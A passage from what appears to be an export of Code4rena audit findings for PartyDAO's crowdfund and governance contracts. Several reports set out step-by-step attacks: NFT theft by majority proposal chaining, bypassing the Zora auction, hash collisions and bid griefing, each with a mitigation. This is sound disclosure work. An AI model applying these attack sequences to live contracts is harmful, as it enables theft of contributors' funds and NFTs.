a medium. The point is that users were not aware they could become minority under this attack flow.   ## Impact Early contributor can always become majority of crowdfund leading to rugging risks.  ## Proof of Concept 1. Victim A opens BuyCrowdfund and deposits 20 ETH 2. Attacker deposits 30 ETH 3. Victim B deposits 50 ETH 4. Suppose NFT costs 100 ETH 5. Attacker will call buy(), requesting 59ETH buy price. His contract will add 41 additional ETH and buy the NFT. 6. Voting power distributed will be: 20 / 59 for Victim A, 30 / 59 for Attacker, 9 / 59 for Victim B. Attacker has majority. 7. User can use some majority attack to take control of the NFT, netting 100 (NFT value) - 41 (external contribution) - 30 (own contribution) = 29 ETH    ## Tools Used Manual audit.  ## Recommended Mitigation Steps Add a Crowdfund property called minimumPrice, which will be visible to all. Buy() function should not accept NFT price < minimumPrice. Users now have assurances that are not susceptible to majority rule if they deposited enough ETH below the minimumPrice.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/280", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/279", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": " A majority attack can steal precious NFT from the party by crafting and chaining two proposals", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/277", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L116 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/FractionalizeProposal.sol#L54-L62   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. Majority cannot exfiltrate the ETH gained from selling precious NFT via any proposal, and it's impossible to sell NFT for any asset except ETH. If the party were to be compensated via an ERC20 token, majority could pass an ArbitraryCallsProposal to transfer these tokens to an attacker wallet. Unfortunately, FractionalizeProposal is vulnerable to this attack. Attacker/s could pass two proposals and wait for them to be ready for execution. Firstly, a FractionalizeProposal to fractionalize the NFT and mint totalVotingPower amount of ERC20 tokens of the created vault. Secondly, an ArbitraryCallsProposal to transfer the entire ERC20 token supply to an attacker address. At this point, attacker can call vault.redeem() to burn the outstanding token supply and receive the NFT back.  ## Impact A 51% majority could steal the precious NFT from the party and leave it empty.  ## Proof of Concept The only non-trivial component of this attack is that the created vault, whose tokens we wish to transfer out, has an undetermined address until VAULT_FACTORY.mint() is called, which creates it. The opcode which creates the vault contract is CREATE, which calculates the address with ```keccak256(VAULT_FACTORY, nonce)```. Nonce will keep changing while new, unrelated NFTs are fractionalized. The attack needs to prepare both FractionalizedProposal and ArbitraryCallsProposal ahead of time, so that they could be chained immediately, meaning there would be no time for other members to call distribute() on the party, which would store the fractionalized tokens safely in the distributor. In order to solve this chicken and the egg problem, we will use a technique taken from traditional low-level exploitation called heap feng shui.   Firstly, calculate off-chain, the rate new NFTs are fractionalized, and multiple by a safety factor (like 1.2X), and multiply again by the proposal execution delay. This number, added to the current VAULT_FACTORY nonce, will be our target_nonce. Calculate ```target_vault = keccak256(VAULT_FACTORY, target_nonce)```, ```before_target_vault = keccak256(VAULT_FACTORY, target_nonce-1)```  Firstly, we will create a contract which has an attack function that: 1. Loop while before_target_vault != created_vault:  \u2022 Mint new dummy attacker_NFT  \u2022 created_vault = VAULT_FACTORY.mint(attacker_NFT\u2026) 2. Call execute() on the FractionalizedProposal  // We will feed the execute() parameters to the contract in a separate contract setter. Note that this is guaranteed to create target_vault on the correct address. 3. Call execute() on the ArbitraryCallsProposal  Then, we propose the two proposals: 1. Propose a FractionalizedProposal, with any list price and the precious NFT as parameter 2. Propose an ArbitraryCallsProposal, with target = target_vault, data = transfer(ATTACKER, totalVotingPower)  Then, we set the execute() parameters passed in step 2 and 3 of the attack contract using the proposalID allocated for them.   Then, we wait for execution delay to finish.  Finally, run the attack() function prepared earlier. This will increment the VAULT_FACTORY nonce until it is the one we count on during the ArbitraryCallsProposal. Pass enough gas to be able to burn enough nonces.  At this point, attacker has all the vault tokens, so he may call vault.redeem() and receive the precious NFT.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps 1. Enforce a minimum cooldown between proposals. This will mitigate additional weaknesses of the proposal structure. Here, this will give users the opportunity to call distribute() to put the vault tokens safe in distributor. 2. A specific fix here would be to call distribute() at the end of FractionalizeProposal so that there is no window to steal the funds.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/273", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/272", "labels": ["bug", "G (Gas Optimization)", "high quality report", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/270", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/269", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/267", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/266", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "A majority attack can easily bypass Zora auction stage in OpenseaProposal and steal the NFT from the party.", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/264", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ListOnZoraProposal.sol#L176-L183   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. One of the main protections is that before listing the NFT on Opensea for a proposal-supplied price, it must first try to be auctioned off on Zora. To move from Zora stage to Opensea stage, _settleZoraAuction() is called when executing ListedOnZora step in ListOnOpenseaProposal.sol. If the function returns false, the next step is executed which lists the item on Opensea. It is assumed that if majority attack proposal reaches this stage, it can steal the NFT for free, because it can list the item for negligible price and immediately purchase it from a contract that executes the Opensea proposal.   Indeed, attacker can always make settleZoraAuction() return false. Looking at  the code: ``` try ZORA.endAuction(auctionId) {             // Check whether auction cancelled due to a failed transfer during             // settlement by seeing if we now possess the NFT.             if (token.safeOwnerOf(tokenId) == address(this)) {                 emit ZoraAuctionFailed(auctionId);                 return false;             }         } catch (bytes memory errData) { ``` As the comment already hints, an auction can be cancelled if the NFT transfer to the bidder fails. This is the relevant AuctionHouse code (endAuction): ``` {             // transfer the token to the winner and pay out the participants below             try IERC721(auctions[auctionId].tokenContract).safeTransferFrom(address(this), auctions[auctionId].bidder, auctions[auctionId].tokenId) {} catch {                 _handleOutgoingBid(auctions[auctionId].bidder, auctions[auctionId].amount, auctions[auctionId].auctionCurrency);                 _cancelAuction(auctionId);                 return;  } ``` As most NFTs inherit from OpenZeppelin's ERC721.sol code, safeTransferFrom will run: ```     function _safeTransfer(         address from,         address to,         uint256 tokenId,         bytes memory data     ) internal virtual {         _transfer(from, to, tokenId);         require(_checkOnERC721Received(from, to, tokenId, data), \"ERC721: transfer to non ERC721Receiver implementer\");     } ``` So, attacker can bid a very high amount on the NFT to ensure it is the winning bid. When AuctionHouse tries to send the NFT to attacker, the safeTransferFrom will fail because attack will not implement an ERC721Receiver. This will force the AuctionHouse to return the bid amount to the bidder and cancel the auction. Importantly, it will lead to a graceful return from endAuction(), which will make settleZoraAuction() return false and progress to the OpenSea stage.  ## Impact A majority attack can easily bypass Zora auction stage and steal the NFT from the party.  ## Proof of Concept 1. Pass a ListOnOpenseaProposal with a tiny list price and execute it 2. Create an attacker contract which bids on the NFT an overpriced amount, but does not implement ERC721Receiver. Call its bid() function 3. Wait for the auction to end ( timeout after the bid() call) 4. Create a contract with a function which calls execute() on the proposal and immediately buys the item on Seaport. Call the attack function.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps _settleZoraAuction is called from both ListOnZoraProposal and ListOnOpenseaProposal. If the auction was cancelled due to a failed transfer, as is described in the comment, we would like to handle it differently for each proposal type. For ListOnZoraProposal, it should indeed return false, in order to finish executing the proposal and not to hang the engine. For ListOnOpenseaProposal, the desired behavior is to *revert* in the case of a failed transfer. This is because the next stage is risky and defense against the mentioned attack is required. Therefore, pass a revertOnFail flag to _settleZoraAuction, which will be used like so: ``` // Check whether auction cancelled due to a failed transfer during // settlement by seeing if we now possess the NFT. if (token.safeOwnerOf(tokenId) == address(this)) {  if (revertOnFail) {   revert(\"Zora auction failed because of transfer to bidder\")  }            emit ZoraAuctionFailed(auctionId);            return false; } ```   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/262", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/261", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/260", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/259", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/258", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/256", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "If auction market finalization always reverts, the fund will be locked in the Crowdfund contract forever.", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/254", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "If auction market finalization always reverts, the fund will be locked in the Crowdfund contract forever."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/253", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/250", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "There is no Support For The Trading of Cryptopunks", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/248", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-09-party-findings", "body": "There is no Support For The Trading of Cryptopunks"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/236", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/235", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/234", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "# Only part of `keccak256()` is used as hash, making it susceptible to collision attacks", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/231", "labels": ["bug", "2 (Med Risk)", "high quality report", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L275 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L325 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L26   # Vulnerability details    At 2 places in the code only part of the output of `keccak256()` is used as the hash: * At `TokenDistributor` - `DistributionState.distributionHash15` - uses only a 15 bytes as a hash     * This one is intended to save storage * At `Crowdfund.governanceOptsHash` a 16 bytes is used as hash     * This one has no benefit at all as it doesn't save on storage   15/16 bytes hash is already not very high to begin with (as explained below). On top of that, using a non standard hash can be unsafe. Since diverging from the standard can break things.    ## Impact   For the `FixedGovernanceOpts` an attacker can create a legitimate party, and then when running `buy()` use the malicious hash to: * include himself in the hosts (DoS-ing the party by vetoing every vote) * reduce the `passThresholdBps` (allowing him to pass any vote, including sending funds from the Party) * Setting himself as `feeRecipient` and increasing the fee   For the `DistributionInfo` struct - an attacker can easily drain all funds from the token distribution contract, by using the legitimate hash to create a distribution with a malicious ERC20 token (and a malicious party contract), and then using the malicious hash to claim assets of a legitimate token.  ## Proof of Concept  ### The attack   Using the birthday attack, for a 50% chance with a 15 bytes hash, the number of hashes needed to generate is 1.4e18 (`(ln(1/0.5) *2) ** 0.5 * (2 ** 60)`). * For 16 bytes that would be 2.2e19  An attacker can create 2 different structs, a legitimate and a malicious one, while modifying at each iteration only the last bits * For the `FixedGovernanceOpts` the last bits would be the `feeRecipient` field * For the `DistributionInfo` struct that would be the `fee` field (and then exploit it via the `claim()` function which doesn't validate the `fee` field)  The attacker will than generate half of the hashes from the malicious one, and half from the legitimate ones, so in case of a collision there's a 50% chance it'd be between the legitimate and malicious struct.    ### CPU  * In the `DistributionInfo` we have 224 bytes (and for `FixedGovernanceOpts` 192 bytes if we precalculate the hosts hash) * A computer needs about 11 cycles per byte * An avg home PC can do ~3e9 cycles per seconds * There are ~8.6e4 seconds a day * Putting it all together `1.4e18 * 11 * 224 / (3e9*8.6e4)` = ~1.3e8  * Note that we can further optimize it (by 10 times at least), since we're using the same input and only modifying the last bits every time (the `fee` field)  ### Storage 32 * 1.4e18 = ~4.5e19 bytes is needed, while an affordable drive can be 8TB=~8e12 bytes. That puts it about 5e6 times away from and affordable attack.   ### Overall Risk The calculations above are for basic equipment, an attacker can be spending more on equipment to get closer (I'd say you can easily multiply that by 100 for a medium size attacker + running the computations for more than one day) Combining that with the fact that a non-standard hash is used, and that in general hashes can have small vulnerabilities that lower a bit their strength - I'd argue it's not very safe to be ~1e4 (for a medium size attacker; ~1.5e5 for 16 bytes) away from a practical attack.    ## Recommended Mitigation Steps Use the standard, 32-bytes, output of `keccak256()`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/230", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/229", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/228", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/227", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/223", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/222", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Attacker can force AuctionCrowdfunds to bid their entire contribution up to maxBid", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/220", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L166-L167   # Vulnerability details  ## Description AuctionCrowdfund's bid() allows any user to compete on an auction on the party's behalf. The code in bid()  forbids placing a bid if party is already winning the auction: ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         } ``` However, it does not account for attackers placing bids from their own wallet, and then immediately overbidding them using the party's funds. This can be used in two ways: 1. Attacker which lists an NFT, can force the party to spend all its funds up to maxBid on the auction, even if the party could have purchased the NFT for much less. 2. Attackers can grief random auctions, making them pay the absolute maximum for the item. Attackers can use this to drive the prices of NFT items up, profiting from this using secondary markets.  ## Impact Parties can be stopped from buying items at a good value without any risk to the attacker.  ## Proof of Concept 1. Attacker places an NFT for sale, valued at X 2. Attacker creates an AuctionCrowdfund, with maxBid = Y such that Y = 2X 3. Current bid for the NFT is X - AUCTION_STEP 3. Users contribute to the fund, which now has 1.5X 4. Users call bid() to bid X  for the NFT 5. Attacker bids for the item externally for 1.5X - AUCTION_STEP 6. Attacker calls bid() to bid 1.5X for the NFT 7. Attacker sells his NFT for 1.5X although no one apart from the party was interested in buying it above price X  ## Tools Used Manual audit.  ## Recommended Mitigation Steps Introduce a new option variable to AuctionCrowdfunds called speedBump. Inside the bid() function, calculate seconds since last bid, multiplied by the price change factor. This product must be smaller than the chosen speedBump. Using this scheme, the protocol would have resistance to sudden bid spikes. Optionally, allow a majority funder to override the speed bump.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/219", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/214", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Attacker can list an NFT they own and inflate to zero all users' contributions, keeping the NFT and all the money", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/213", "labels": ["bug", "2 (Med Risk)", "old-submission-method"], "target": "2022-09-party-findings", "body": "Attacker can list an NFT they own and inflate to zero all users' contributions, keeping the NFT and all the money"}, {"title": "Calling `transferEth` function can revert if `receiver` input corresponds to a contract that is unable to receive ETH through its `receive` or `fallback` function", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/212", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388   # Vulnerability details  ## Impact The following `transferEth` function is called when calling the `_burn` or `_transfer` function below. If the `receiver` input for the `transferEth` function corresponds to a contract, it is possible that the receiver contract does not, intentionally or unintentionally, implement the `receive` or `fallback` function in a way that supports receiving ETH or that calling the receiver contract's `receive` or `fallback` function executes complicated logics that cost much gas, which could cause calling `transferEth` to revert. For example, when calling `transferEth` reverts, calling `_burn` also reverts; this means that the receiver contract would not be able to get the voting power and receive the extra contribution it made after the crowdfunding finishes; yet, the receiver contract deserves these voting power and contribution refund. Hence, the receiver contract loses valuables that it deserves, which is unfair to the users who controls it.  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 ```solidity     function transferEth(address payable receiver, uint256 amount)         internal     {         (bool s, bytes memory r) = receiver.call{value: amount}(\"\");         if (!s) {             revert EthTransferFailed(receiver, r);         }     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 ```solidity     function _burn(address payable contributor, CrowdfundLifecycle lc, Party party_)         private     {         // If the CF has won, a party must have been created prior.         if (lc == CrowdfundLifecycle.Won) {             if (party_ == Party(payable(0))) {                 revert NoPartyError();             }         } else if (lc != CrowdfundLifecycle.Lost) {             // Otherwise it must have lost.             revert WrongLifecycleError(lc);         }         // Split recipient can burn even if they don't have a token.         if (contributor == splitRecipient) {             if (_splitRecipientHasBurned) {                 revert SplitRecipientAlreadyBurnedError();             }             _splitRecipientHasBurned = true;         }         // Revert if already burned or does not exist.         if (splitRecipient != contributor || _doesTokenExistFor(contributor)) {             CrowdfundNFT._burn(contributor);         }         // Compute the contributions used and owed to the contributor, along         // with the voting power they'll have in the governance stage.         (uint256 ethUsed, uint256 ethOwed, uint256 votingPower) =             _getFinalContribution(contributor);         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         }         // Refund any ETH owed back to the contributor.         contributor.transferEth(ethOwed);         emit Burned(contributor, ethUsed, ethOwed, votingPower);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388 ```solidity     function _transfer(         TokenType tokenType,         address token,         address payable recipient,         uint256 amount     )         private     {         bytes32 balanceId = _getBalanceId(tokenType, token);         // Reduce stored token balance.         _storedBalances[balanceId] -= amount;         if (tokenType == TokenType.Native) {             recipient.transferEth(amount);         } else {             assert(tokenType == TokenType.Erc20);             IERC20(token).compatTransfer(recipient, amount);         }     } ```  ## Proof of Concept Please add the following `error` and append the test in `sol-tests\\crowdfund\\BuyCrowdfund.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     error EthTransferFailed(address receiver, bytes errData);      function testContributorContractFailsToReceiveETH() public {         uint256 tokenId = erc721Vault.mint();         BuyCrowdfund pb = _createCrowdfund(tokenId, 0);          // This contract is used to simulate a contract that does not implement the receive or fallback function for the purpose of receiving ETH.         address payable contributorContract = payable(address(this));         vm.deal(contributorContract, 1e18);          address delegate = _randomAddress();          // contributorContract contributes 1e18.         vm.prank(contributorContract);         pb.contribute{ value: 1e18 }(delegate, \"\");          // The price of the NFT of interest is 0.5e18.         Party party_ = pb.buy(             payable(address(erc721Vault)),             0.5e18,             abi.encodeCall(erc721Vault.claim, (tokenId)),             defaultGovernanceOpts         );          // After calling the buy function, the party is created with the NFT.         assertEq(address(party), address(party_));         assertTrue(pb.getCrowdfundLifecycle() == Crowdfund.CrowdfundLifecycle.Won);         assertEq(pb.settledPrice(), 0.5e18);         assertEq(pb.totalContributions(), 1e18);         assertEq(address(pb).balance, 1e18 - 0.5e18);          // Calling the burn function reverts because contributorContract cannot receive ETH through the receive or fallback function         vm.expectRevert(abi.encodeWithSelector(             EthTransferFailed.selector,             contributorContract,             \"\"         ));         pb.burn(contributorContract);          // contributorContract does not receive 0.5e18 back from the BuyCrowdfund contract.         assertEq(contributorContract.balance, 0);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When calling the `transferEth` function, if the receiver contract is unable to receive ETH through its `receive` or `fallback` function, WETH can be used to deposit the corresponding ETH amount, and the deposited amount can be transferred to the receiver contract."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/210", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/209", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/203", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "The settledPrice maybe exceed maximumPrice", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/201", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L122   # Vulnerability details  ## Impact  BuyCrowdfundBase.sol _buy() When callValue = 0 is settledPrice to totalContributions ignoring whether totalContributions > maximumPrice resulting in the minimum proportion of participants expected to become smaller  ## Proof of Concept ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;  //**** not check totalContributions>maximumPrice****//             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }             settledPrice = settledPrice_;     ```  (AuctionCrowdfund.sol finalize()  similar)  ## Recommended Mitigation Steps add check  ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }  +++         if (maximumPrice_ != 0 && settledPrice_ > maximumPrice_) { +++                settledPrice_ = maximumPrice_; +++         }              settledPrice = settledPrice_;     ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/200", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/199", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Attacker can create a AuctionCrowdfund and rug any contributions made by other users", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/198", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "Attacker can create a AuctionCrowdfund and rug any contributions made by other users"}, {"title": "NFT Owner can stuck Crowdfund user funds", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/197", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L236   # Vulnerability details  ## Impact Consider a scenario where few users contributed in auction but noone has placed any bid due to reason like NFT price crash etc. So there was 0 bid, nft owner could seize the crowdfund users fund until they pay a ransom amount as shown below.  ## Proof of Concept 1. NFT N auction is going on 2. CrowdFund users have contributed 100 amount for this auction 3. Bidding has not been done yet 4. A news came for this NFT owner which leads to crashing of this NFT price 5. CrowdFund users are happy that they have not bided and are just waiting for auction to complete so that they can get there refund 6. NFT owner realizing this blackmails the CrowdFund users to send him amount 50 or else he would send this worthless NFT to the Crowdfund Auction contract basically stucking all crowdfund users fund. CrowdFund users ignore this and simply wait for auction to end 7. Once auction completes [finalize function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L196) is called  ``` function finalize(FixedGovernanceOpts memory governanceOpts)         external         onlyDelegateCall         returns (Party party_)     { ...  if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions;                 if (lastBid_ == 0) {                     // Nobody ever contributed. The NFT is effectively burned.                     revert NoContributionsError();                 }                 lastBid = lastBid_;             }             // Create a governance party around the NFT.             party_ = _createParty(                 _getPartyFactory(),                 governanceOpts,                 nftContract,                 nftTokenId             );             emit Won(lastBid_, party_);         }  ... } ```  8. Before calling finalize the lastBid was 0 since no one has bid on this auction but lets see what happens on calling finalize  9. Since NFT owner has transferred NFT to this contract so below statement holds true and lastBid_ is also 0 since no one has bided  ``` if (lastBid_ == 0) {                 lastBid_ = totalContributions; ```  10. This means now lastBid_ is changed to totalContributions which is 100 so crowdfund users funds will not be refunded and they will end up with non needed NFT.   ## Recommended Mitigation Steps Remove the line lastBid_ = totalContributions; and let it be the last bid amount which crowdfund users actually bided with."}, {"title": "Attacker can DOS private party by donating ETH then calling buy", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/196", "labels": ["bug", "3 (High 